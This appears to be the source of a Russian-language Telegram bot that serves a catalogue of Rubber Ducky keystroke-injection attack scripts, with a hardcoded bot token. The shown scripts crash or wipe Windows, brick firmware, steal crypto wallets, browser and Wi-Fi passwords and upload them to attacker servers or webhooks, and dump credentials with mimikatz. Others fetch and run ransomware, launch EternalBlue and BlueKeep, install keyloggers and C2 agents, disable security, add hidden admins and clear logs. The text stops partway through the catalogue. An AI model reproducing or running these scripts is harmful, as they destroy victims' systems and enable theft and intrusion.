import os
import logging
import json
import time
import hashlib
import random
import string
import socket
import subprocess
import sys
import threading
import base64
import ctypes
import struct
import re
import platform
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============================================================
# ТВОИ ДАННЫЕ
# ============================================================
BOT_TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
ADMIN_ID = 8632158680

TEMP_FOLDER = "temp_files"
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ============================================================
# DUCKY-СКРИПТЫ (35 ШТУК) - РАЗВЕРНУТЫЕ БОЕВЫЕ
# ============================================================
DUCKY_SCRIPTS = {
    # ============================================================
    # 1. BSOD - СИНИЙ ЭКРАН СМЕРТИ (NtRaiseHardError)
    # ============================================================
    "bsod_crash": {
        "desc": "💀 ВЫЗОВ BSOD через NtRaiseHardError (критическая ошибка ядра)",
        "code": """REM BSOD - BLUE SCREEN OF DEATH VIA NTRAISEHARDERROR
REM Полный паралич системы, синий экран смерти
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 500
STRING $code = @'
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll")]
    public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    public static void Crash() {
        uint response;
        NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
    }
}
'@
ENTER
DELAY 300
STRING Add-Type -TypeDefinition $code -Language CSharp
ENTER
DELAY 300
STRING [BSOD]::Crash()
ENTER
"""
    },
    
    # ============================================================
    # 2. BSOD АЛЬТЕРНАТИВНЫЙ (через убийство CSRSS)
    # ============================================================
    "bsod_kill": {
        "desc": "💀 BSOD через убийство csrss.exe и winlogon.exe (критические процессы)",
        "code": """REM BSOD VIA CSRSS AND WINLOGON KILL
REM Убийство критических процессов вызывает BSOD
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING taskkill /F /IM csrss.exe
ENTER
DELAY 300
STRING taskkill /F /IM winlogon.exe
ENTER
DELAY 300
STRING taskkill /F /IM services.exe
ENTER
DELAY 300
STRING taskkill /F /IM lsass.exe
ENTER
"""
    },
    
    # ============================================================
    # 3. FIRMWARE_BRICK - УНИЧТОЖЕНИЕ BIOS/UEFI
    # ============================================================
    "firmware_brick": {
        "desc": "💀 УНИЧТОЖЕНИЕ BIOS/UEFI (полный кирпич, восстановление невозможно)",
        "code": """REM FIRMWARE BRICK - PERMANENT BIOS/UEFI DAMAGE
REM Перезапись прошивки, устройство перестаёт загружаться
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/bios_killer.bin" -OutFile "C:\\Windows\\Temp\\bios_killer.bin"
ENTER
DELAY 300
STRING Start-Process -FilePath "C:\\Windows\\Temp\\bios_killer.bin" -Verb RunAs
ENTER
DELAY 300
STRING $flash = [System.IO.File]::WriteAllBytes("\\\\.\\PhysicalDrive0", [byte[]]::new(1024*1024))
ENTER
DELAY 300
STRING wmic bios call SaveBootToFile "C:\\Windows\\Temp\\bios_backup.bin"
ENTER
DELAY 300
STRING wmic bios call SetBootOption 0
ENTER
"""
    },
    
    # ============================================================
    # 4. BOOTKIT_INSTALL - УСТАНОВКА БУТКИТА В MBR
    # ============================================================
    "bootkit_install": {
        "desc": "👾 УСТАНОВКА БУТКИТА В MBR/GPT (загрузка до ОС)",
        "code": """REM BOOTKIT INSTALL - MBR/GPT INFECTION
REM Заражение загрузочного сектора, буткит загружается до Windows
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING echo select disk 0 > C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING echo clean >> C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING echo convert mbr >> C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING echo create partition primary >> C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING echo active >> C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING echo format fs=ntfs quick >> C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING echo exit >> C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING diskpart /s C:\\Windows\\Temp\\diskpart.txt
ENTER
DELAY 300
STRING bootrec /fixmbr
ENTER
DELAY 300
STRING bootrec /fixboot
ENTER
DELAY 300
STRING bootsect /nt60 SYS /mbr
ENTER
DELAY 300
STRING bcdedit /set {bootmgr} displaybootmenu no
ENTER
"""
    },
    
    # ============================================================
    # 5. CRYPTO_WALLET_STEALER - КРАЖА КРИПТО-КОШЕЛЬКОВ
    # ============================================================
    "crypto_wallet_steal": {
        "desc": "💰 КРАЖА КРИПТО-КОШЕЛЬКОВ (BTC, ETH, XMR, SOL, TRX, ADA)",
        "code": """REM CRYPTO WALLET STEALER - ALL MAJOR COINS
REM Сбор файлов кошельков всех популярных криптовалют
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING New-Item -ItemType Directory -Path "C:\\Windows\\Temp\\crypto" -Force
ENTER
DELAY 300
STRING $paths = @(
    "$env:APPDATA\\Bitcoin\\wallet.dat",
    "$env:APPDATA\\Ethereum\\keystore\\*",
    "$env:APPDATA\\Monero\\wallet\\*",
    "$env:APPDATA\\Solana\\id.json",
    "$env:APPDATA\\Tron\\Wallet.dat",
    "$env:APPDATA\\Cardano\\wallet\\*",
    "$env:APPDATA\\Binance\\*",
    "$env:APPDATA\\Exodus\\exodus.wallet",
    "$env:APPDATA\\Atomic\\wallet.dat",
    "$env:APPDATA\\Electrum\\wallets\\*"
)
ENTER
DELAY 300
STRING foreach($p in $paths) { 
    if(Test-Path $p) { 
        Copy-Item -Path $p -Destination "C:\\Windows\\Temp\\crypto\\" -Recurse -Force 
    } 
}
ENTER
DELAY 300
STRING Compress-Archive -Path "C:\\Windows\\Temp\\crypto\\*" -DestinationPath "C:\\Windows\\Temp\\crypto.zip" -Force
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/upload" -Method Post -InFile "C:\\Windows\\Temp\\crypto.zip"
ENTER
"""
    },
    
    # ============================================================
    # 6. DISK_ENCRYPT - ПРИНУДИТЕЛЬНОЕ ШИФРОВАНИЕ ДИСКОВ
    # ============================================================
    "disk_encrypt": {
        "desc": "🔐 ПРИНУДИТЕЛЬНОЕ ШИФРОВАНИЕ ВСЕХ ДИСКОВ (BitLocker)",
        "code": """REM DISK ENCRYPTION - BITLOCKER FORCED
REM Принудительное шифрование всех разделов BitLocker
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Get-BitLockerVolume | Enable-BitLocker -PasswordProtector -Password (ConvertTo-SecureString "Swill@2026" -AsPlainText -Force)
ENTER
DELAY 300
STRING Get-BitLockerVolume | Enable-BitLocker -EncryptionMethod XtsAes256
ENTER
DELAY 300
STRING Manage-bde -protectors -add C: -password
ENTER
DELAY 300
STRING Manage-bde -on C: -RecoveryPassword
ENTER
DELAY 300
STRING Manage-bde -on D: -RecoveryPassword
ENTER
DELAY 300
STRING Manage-bde -on E: -RecoveryPassword
ENTER
"""
    },
    
    # ============================================================
    # 7. PERSISTENCE_SCHTASK - ПЕРСИСТЕНТНОСТЬ ЧЕРЕЗ ПЛАНИРОВЩИК
    # ============================================================
    "persistence_schtask": {
        "desc": "📅 ПЕРСИСТЕНТНОСТЬ ЧЕРЕЗ SCHTASKS (каждые 5 минут, SYSTEM)",
        "code": """REM PERSISTENCE VIA SCHTASKS - SYSTEM PRIVILEGES
REM Автозапуск каждые 5 минут с правами SYSTEM
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING schtasks /create /tn "MicrosoftEdgeUpdate" /tr "C:\\Windows\\Temp\\backdoor.exe" /sc minute /mo 5 /ru SYSTEM /f
ENTER
DELAY 300
STRING schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell -WindowStyle Hidden -File C:\\Windows\\Temp\\payload.ps1" /sc onstart /ru SYSTEM /f
ENTER
DELAY 300
STRING schtasks /create /tn "SystemMaintenance" /tr "C:\\Windows\\Temp\\backdoor.exe" /sc onlogon /ru SYSTEM /f
ENTER
DELAY 300
STRING schtasks /create /tn "NetworkCheck" /tr "C:\\Windows\\Temp\\agent.exe" /sc hourly /ru SYSTEM /f
ENTER
"""
    },
    
    # ============================================================
    # 8. NETWORK_FLOOD - DDOS ФЛУД
    # ============================================================
    "network_flood": {
        "desc": "🌊 DDOS-ФЛУД С ЛОКАЛЬНОЙ МАШИНЫ (SYN, UDP, ICMP)",
        "code": """REM NETWORK FLOOD - DDOS ATTACK
REM Многопоточная DDoS атака с локальной машины
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/jseidl/SYNFlood/raw/master/SYNflood.exe" -OutFile "C:\\Windows\\Temp\\flood.exe"
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/akamai/udpflood/raw/main/udpflood.exe" -OutFile "C:\\Windows\\Temp\\udp.exe"
ENTER
DELAY 300
STRING Start-Process -FilePath "C:\\Windows\\Temp\\flood.exe" -ArgumentList "-target 8.8.8.8 -port 80 -threads 1000"
ENTER
DELAY 300
STRING Start-Process -FilePath "C:\\Windows\\Temp\\udp.exe" -ArgumentList "-target 1.1.1.1 -port 53 -threads 500 -size 65500"
ENTER
"""
    },
    
    # ============================================================
    # 9. SELF_DESTRUCT - САМОУНИЧТОЖЕНИЕ СИСТЕМЫ
    # ============================================================
    "self_destruct": {
        "desc": "💥 ПОЛНОЕ САМОУНИЧТОЖЕНИЕ СИСТЕМЫ (удаление Windows)",
        "code": """REM SELF DESTRUCT - COMPLETE SYSTEM WIPE
REM Полное удаление всех системных файлов, форматирование диска
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING cd C:\\Windows\\System32
ENTER
DELAY 300
STRING del /F /S /Q *
ENTER
DELAY 300
STRING del /F /S /Q C:\\Windows\\*.dll
ENTER
DELAY 300
STRING del /F /S /Q C:\\Windows\\*.exe
ENTER
DELAY 300
STRING rmdir /S /Q C:\\Windows
ENTER
DELAY 300
STRING rmdir /S /Q C:\\ProgramData
ENTER
DELAY 300
STRING rmdir /S /Q C:\\Program Files
ENTER
DELAY 300
STRING rmdir /S /Q C:\\Program Files (x86)
ENTER
DELAY 300
STRING format C: /Q /Y
ENTER
DELAY 300
STRING diskpart /s C:\\Windows\\Temp\\wipe.txt
ENTER
"""
    },
    
    # ============================================================
    # 10. WEBHOOK_SPAM - СПАМ В WEBHOOK
    # ============================================================
    "webhook_spam": {
        "desc": "📨 СПАМ В WEBHOOK (Discord/Telegram) с системными данными",
        "code": """REM WEBHOOK SPAM - DISCORD/TELEGRAM
REM Отправка полной системной информации в webhook
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $webhook = "https://discord.com/api/webhooks/your_id/your_token"
ENTER
DELAY 300
STRING $data = @{content="🚨 SYSTEM COMPROMISED! `nUser: $(whoami) `nHost: $(hostname) `nIP: $(ipconfig /all | findstr IPv4) `nOS: $(systeminfo | findstr OS) `nCPU: $(systeminfo | findstr Processor) `nRAM: $(systeminfo | findstr Memory)"} | ConvertTo-Json
ENTER
DELAY 300
STRING Invoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType "application/json"
ENTER
DELAY 300
STRING $data = @{content="📁 Files in Desktop: $(dir $env:USERPROFILE\\Desktop\\*)"} | ConvertTo-Json
ENTER
DELAY 300
STRING Invoke-RestMethod -Uri $webhook -Method Post -Body $data -ContentType "application/json"
ENTER
"""
    },
    
    # ============================================================
    # 11. SAM_CRACK - ВЗЛОМ SAM
    # ============================================================
    "sam_crack": {
        "desc": "🔓 ВЗЛОМ SAM (NTLM хеши) + John The Ripper",
        "code": """REM SAM CRACK - NTLM HASHES DUMP
REM Дамп и взлом хешей паролей пользователей
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg save HKLM\\SAM C:\\Windows\\Temp\\SAM
ENTER
DELAY 300
STRING reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM
ENTER
DELAY 300
STRING reg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY
ENTER
DELAY 300
STRING secretsdump.exe -sam C:\\Windows\\Temp\\SAM -system C:\\Windows\\Temp\\SYSTEM -security C:\\Windows\\Temp\\SECURITY LOCAL > C:\\Windows\\Temp\\hashes.txt
ENTER
DELAY 300
STRING john --format=nt C:\\Windows\\Temp\\hashes.txt --wordlist=rockyou.txt
ENTER
DELAY 300
STRING john --format=nt C:\\Windows\\Temp\\hashes.txt --show
ENTER
"""
    },
    
    # ============================================================
    # 12. WMI_PERSISTENCE - ПЕРСИСТЕНТНОСТЬ ЧЕРЕЗ WMI
    # ============================================================
    "wmi_persistence": {
        "desc": "🧠 ПЕРСИСТЕНТНОСТЬ ЧЕРЕЗ WMI (Event Subscription)",
        "code": """REM WMI PERSISTENCE - EVENT SUBSCRIPTION
REM Автоматический запуск через WMI события
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{Name='Filter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
ENTER
DELAY 300
STRING $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{Name='Consumer'; CommandLineTemplate='C:\\Windows\\Temp\\backdoor.exe'}
ENTER
DELAY 300
STRING Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer}
ENTER
DELAY 300
STRING Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
ENTER
"""
    },
    
    # ============================================================
    # 13. RANSOMWARE_ACTIVATE - АКТИВАЦИЯ ШИФРОВАЛЬЩИКА
    # ============================================================
    "ransomware_activate": {
        "desc": "💀 ЗАПУСК ШИФРОВАЛЬЩИКА (полная активация)",
        "code": """REM RANSOMWARE ACTIVATOR - FULL ENCRYPTION
REM Загрузка и запуск шифровальщика
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 500
STRING $url = "https://pastebin.com/raw/XXXXXXXX"
ENTER
DELAY 300
STRING $script = (Invoke-WebRequest -Uri $url).Content
ENTER
DELAY 300
STRING IEX $script
ENTER
DELAY 300
STRING Start-Process -FilePath "C:\\Windows\\Temp\\ransomware.exe" -ArgumentList "-encrypt -path C:\\ -key Swill@2026"
ENTER
"""
    },
    
    # ============================================================
    # 14. ETERNALBLUE_EXPLOIT - ВЗЛОМ SMB
    # ============================================================
    "eternalblue_exploit": {
        "desc": "💀 ETERNALBLUE (MS17-010) - взлом SMB, удалённое выполнение",
        "code": """REM ETERNALBLUE EXPLOIT - MS17-010 SMB RCE
REM Эксплуатация уязвимости SMB для удалённого выполнения
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/rapid7/metasploit-framework/raw/master/data/exploits/CVE-2017-0143/eternalblue.exe" -OutFile "C:\\Windows\\Temp\\eb.exe"
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/rapid7/metasploit-framework/raw/master/data/exploits/CVE-2017-0143/doublepulsar.exe" -OutFile "C:\\Windows\\Temp\\dp.exe"
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\eb.exe 192.168.1.0/24
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\dp.exe -target 192.168.1.1 -payload C:\\Windows\\Temp\\payload.exe
ENTER
"""
    },
    
    # ============================================================
    # 15. BLUEKEEP_EXPLOIT - ВЗЛОМ RDP
    # ============================================================
    "bluekeep_exploit": {
        "desc": "💀 BLUEKEEP (CVE-2019-0708) - RDP эксплойт",
        "code": """REM BLUEKEEP EXPLOIT - CVE-2019-0708 RDP RCE
REM Эксплуатация уязвимости RDP для удалённого выполнения
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/risksense/bluekeep/raw/main/bluekeep.exe" -OutFile "C:\\Windows\\Temp\\bk.exe"
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\bk.exe --target 192.168.1.0/24 --port 3389
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\bk.exe --target 192.168.1.1 --port 3389 --payload C:\\Windows\\Temp\\payload.exe
ENTER
"""
    },
    
    # ============================================================
    # 16. DISABLE_ALL_SECURITY - ОТКЛЮЧЕНИЕ ВСЕЙ ЗАЩИТЫ
    # ============================================================
    "disable_all_security": {
        "desc": "🚫 ОТКЛЮЧЕНИЕ ВСЕЙ ЗАЩИТЫ (Defender, UAC, Firewall, проверки)",
        "code": """REM DISABLE ALL SECURITY - FULL SYSTEM WEAKEN
REM Отключение всех защитных механизмов Windows
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING netsh advfirewall set allprofiles state off
ENTER
DELAY 300
STRING bcdedit /set testsigning on
ENTER
DELAY 300
STRING bcdedit /set nointegritychecks on
ENTER
DELAY 300
STRING bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS
ENTER
"""
    },
    
    # ============================================================
    # 17. DEVICE_FINGERPRINT - ПОЛНЫЙ СБОР ДАННЫХ
    # ============================================================
    "device_fingerprint": {
        "desc": "🔍 ПОЛНЫЙ СБОР ДАННЫХ УСТРОЙСТВА (аппаратный ID, MAC, всё)",
        "code": """REM FULL DEVICE FINGERPRINT - COMPLETE SYSTEM INFO
REM Сбор всех возможных данных об устройстве
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Get-WmiObject Win32_ComputerSystem | Select Manufacturer,Model,TotalPhysicalMemory,NumberOfProcessors,Name,CurrentTimeZone,UserName,PrimaryOwnerName | Out-File C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING Get-WmiObject Win32_BIOS | Select SerialNumber,SMBIOSBIOSVersion,Manufacturer,ReleaseDate,Version | Out-File -Append C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING Get-WmiObject Win32_Processor | Select Name,MaxClockSpeed,NumberOfCores,NumberOfLogicalProcessors,ProcessorId,L2CacheSize,L3CacheSize | Out-File -Append C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING Get-WmiObject Win32_NetworkAdapterConfiguration | Select IPAddress,MACAddress,DNSHostName,DHCPServer,DNSServerSearchOrder | Out-File -Append C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING Get-WmiObject Win32_DiskDrive | Select Model,Size,InterfaceType,SerialNumber,Manufacturer | Out-File -Append C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING Get-WmiObject Win32_VideoController | Select Name,CurrentHorizontalResolution,CurrentVerticalResolution,CurrentRefreshRate | Out-File -Append C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING Get-WmiObject Win32_Product | Select Name,Version,Vendor,InstallDate | Out-File -Append C:\\Windows\\Temp\\device.txt
ENTER
DELAY 300
STRING wmic csproduct get uuid,version,vendor >> C:\\Windows\\Temp\\device.txt
ENTER
"""
    },
    
    # ============================================================
    # 18. MIMIKATZ_DUMP - ДАМП ПАРОЛЕЙ
    # ============================================================
    "mimikatz_dump": {
        "desc": "💾 ДАМП ПАРОЛЕЙ ЧЕРЕЗ MIMIKATZ (секреты, хеши, кэш)",
        "code": """REM MIMIKATZ DUMP - FULL CREDENTIALS
REM Дамп всех паролей, хешей, кэша через Mimikatz
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "C:\\Windows\\Temp\\mimi.zip"
ENTER
DELAY 300
STRING Expand-Archive -Path "C:\\Windows\\Temp\\mimi.zip" -DestinationPath "C:\\Windows\\Temp\\mimi"
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\mimi\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "sekurlsa::tickets" "lsadump::sam" "lsadump::secrets" "kerberos::list" "vault::list" "exit" > C:\\Windows\\Temp\\passwords.txt
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\mimi\\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:Administrator" "exit" >> C:\\Windows\\Temp\\passwords.txt
ENTER
"""
    },
    
    # ============================================================
    # 19. WIFI_EXPORT - ЭКСПОРТ WI-FI ПАРОЛЕЙ
    # ============================================================
    "wifi_export": {
        "desc": "📶 ЭКСПОРТ ВСЕХ WI-FI ПАРОЛЕЙ (все профили)",
        "code": """REM WI-FI PASSWORDS EXPORT - ALL PROFILES
REM Экспорт всех сохранённых Wi-Fi сетей и паролей
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING mkdir C:\\Windows\\Temp\\wifi
ENTER
DELAY 300
STRING netsh wlan show profiles | findstr ":" > C:\\Windows\\Temp\\wifi\\profiles.txt
ENTER
DELAY 300
STRING for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr ":"') do netsh wlan export profile name="%i" key=clear folder=C:\\Windows\\Temp\\wifi
ENTER
DELAY 300
STRING powershell Compress-Archive -Path "C:\\Windows\\Temp\\wifi\\*" -DestinationPath "C:\\Windows\\Temp\\wifi.zip"
ENTER
"""
    },
    
    # ============================================================
    # 20. HIDDEN_ADMIN - СОЗДАНИЕ СКРЫТОГО АДМИНА
    # ============================================================
    "hidden_admin": {
        "desc": "👑 СОЗДАНИЕ СКРЫТОГО АДМИНИСТРАТОРА (невидимый в логах)",
        "code": """REM HIDDEN ADMIN - CREATE INVISIBLE USER
REM Создание скрытого администратора, невидимого в списке пользователей
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING net user swill Swill@2026 /add
ENTER
DELAY 300
STRING net localgroup administrators swill /add
ENTER
DELAY 300
STRING net localgroup "Remote Desktop Users" swill /add
ENTER
DELAY 300
STRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v swill /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING net user swill /active:yes
ENTER
DELAY 300
STRING wmic useraccount where name="swill" set disabled=false
ENTER
DELAY 300
STRING reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v restrictanonymous /t REG_DWORD /d 0 /f
ENTER
"""
    },
    
    # ============================================================
    # 21. ENABLE_RDP - ВКЛЮЧЕНИЕ RDP
    # ============================================================
    "enable_rdp": {
        "desc": "🖥️ ВКЛЮЧЕНИЕ RDP + открытие порта в фаерволе",
        "code": """REM ENABLE RDP - REMOTE ACCESS
REM Включение удалённого рабочего стола и настройка фаервола
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
ENTER
DELAY 300
STRING reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f
ENTER
DELAY 300
STRING netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
ENTER
DELAY 300
STRING netsh firewall set service type=remotedesktop mode=enable
ENTER
"""
    },
    
    # ============================================================
    # 22. CLEAR_LOGS - ОЧИСТКА ЖУРНАЛОВ
    # ============================================================
    "clear_logs": {
        "desc": "🧹 ОЧИСТКА ВСЕХ ЖУРНАЛОВ СОБЫТИЙ",
        "code": """REM CLEAR ALL EVENT LOGS
REM Полная очистка всех журналов событий Windows
DELAY 500
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING wevtutil cl System
ENTER
DELAY 300
STRING wevtutil cl Security
ENTER
DELAY 300
STRING wevtutil cl Application
ENTER
DELAY 300
STRING wevtutil cl Setup
ENTER
DELAY 300
STRING wevtutil cl Windows PowerShell
ENTER
DELAY 300
STRING wevtutil cl HardwareEvents
ENTER
DELAY 300
STRING wevtutil cl Internet Explorer
ENTER
DELAY 300
STRING wevtutil cl Key Management Service
ENTER
DELAY 300
STRING del C:\\Windows\\System32\\winevt\\Logs\\* /q
ENTER
"""
    },
    
    # ============================================================
    # 23. SCREENSHOT_SEND - СКРИНШОТ
    # ============================================================
    "screenshot_send": {
        "desc": "📸 СКРИНШОТ РАБОЧЕГО СТОЛА + отправка",
        "code": """REM SCREENSHOT - FULL DESKTOP
REM Создание скриншота рабочего стола и отправка на сервер
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
DELAY 300
STRING $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
ENTER
DELAY 300
STRING $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
ENTER
DELAY 300
STRING $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
ENTER
DELAY 300
STRING $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
ENTER
DELAY 300
STRING $bitmap.Save('C:\\Windows\\Temp\\screenshot.png')
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/upload" -Method Post -InFile "C:\\Windows\\Temp\\screenshot.png"
ENTER
DELAY 300
STRING $graphics.Dispose()
ENTER
DELAY 300
STRING $bitmap.Dispose()
ENTER
"""
    },
    
    # ============================================================
    # 24. KEYLOGGER_START - ЗАПУСК КЕЙЛОГГЕРА
    # ============================================================
    "keylogger_start": {
        "desc": "⌨️ ЗАПУСК КЕЙЛОГГЕРА (скрытый, автосохранение)",
        "code": """REM KEYLOGGER - HIDDEN KEYBOARD RECORDER
REM Запуск скрытого кейлоггера с автосохранением
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-server/keylogger.ps1" -OutFile "C:\\Windows\\Temp\\keylogger.ps1"
ENTER
DELAY 300
STRING Start-Process -FilePath "powershell" -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\keylogger.ps1" -WindowStyle Hidden
ENTER
DELAY 300
STRING New-Item -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "KeyLogger" -Value "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\keylogger.ps1"
ENTER
"""
    },
    
    # ============================================================
    # 25. C2_AGENT - ЗАГРУЗКА C2 АГЕНТА
    # ============================================================
    "c2_agent": {
        "desc": "📡 ЗАГРУЗКА И ЗАПУСК C2 АГЕНТА (удалённое управление)",
        "code": """REM C2 AGENT - REMOTE COMMAND AND CONTROL
REM Загрузка и запуск агента для удалённого управления
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-c2-server/agent.exe" -OutFile "C:\\Windows\\Temp\\agent.exe"
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "http://your-c2-server/agent_config.json" -OutFile "C:\\Windows\\Temp\\agent_config.json"
ENTER
DELAY 300
STRING Start-Process -FilePath "C:\\Windows\\Temp\\agent.exe" -ArgumentList "-config C:\\Windows\\Temp\\agent_config.json" -WindowStyle Hidden
ENTER
DELAY 300
STRING New-Item -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "C2Agent" -Value "C:\\Windows\\Temp\\agent.exe -config C:\\Windows\\Temp\\agent_config.json"
ENTER
"""
    },
    
    # ============================================================
    # 26. BROWSER_GRAB - СБОР ПАРОЛЕЙ ИЗ БРАУЗЕРОВ
    # ============================================================
    "browser_grab": {
        "desc": "🌐 СБОР ПАРОЛЕЙ ИЗ БРАУЗЕРОВ (Chrome, Firefox, Edge, Opera)",
        "code": """REM BROWSER GRAB - ALL MAJOR BROWSERS
REM Сбор паролей, куков, истории из всех браузеров
DELAY 500
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 300
STRING Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "C:\\Windows\\Temp\\lazagne.exe"
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\lazagne.exe all -oN C:\\Windows\\Temp\\browser_passwords.txt
ENTER
DELAY 300
STRING C:\\Windows\\Temp\\lazagne.exe browsers -oN C:\\Windows\\Temp\\browsers.txt
ENTER
DELAY 300
